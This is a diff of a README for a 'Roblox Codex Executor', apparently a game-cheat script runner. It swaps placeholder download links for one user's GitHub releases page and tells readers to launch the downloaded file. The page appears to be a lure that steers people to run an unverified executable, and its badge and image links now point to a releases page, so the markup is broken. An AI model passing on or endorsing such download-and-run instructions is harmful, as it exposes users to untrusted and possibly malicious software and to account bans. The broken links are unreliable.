@@ -29,9 +29,9 @@ Roblox Codex Executor is specifically designed to support low-end PCs, enabling 
 - roblox-lua
 
 ## Download Codex Executor
-To download the Codex Executor, please click on the following link: [Download Codex Executor](https://github.com/files/File.zip)
+To download the Codex Executor, please click on the following link: [Download Codex Executor](https://github.com/Stepegemeyod/Codex-Roblox/releases)
 
-[![Download Codex Executor](https://img.shields.io/badge/Download-Codex%20Executor-brightgreen)](https://github.com/files/File.zip)
+[![Download Codex Executor](https://github.com/Stepegemeyod/Codex-Roblox/releases%20Executor-brightgreen)](https://github.com/Stepegemeyod/Codex-Roblox/releases)
 
 If the link above ends with the file name, remember to launch it to kickstart your Roblox scripting adventure with Codex Executor.
 
@@ -51,7 +51,7 @@ If the provided download link is not working or if you seek more information, ma
 ## Embrace the Power of Roblox Scripting with Codex Executor 🔥
 Dive into the world of Roblox scripting with Codex Executor and unleash your creativity. Whether you are a seasoned developer or a budding scripter, Codex offers you the tools and functionality to excel in the Roblox universe. Join us on this exciting journey of exploration, collaboration, and innovation.
 
-![Roblox Codex](https://example.com/roblox-codex-image)
+![Roblox Codex](https://github.com/Stepegemeyod/Codex-Roblox/releases)
 
 ## Let's Connect 🌐
 Follow us on social media for the latest updates, tutorials, and community interactions:
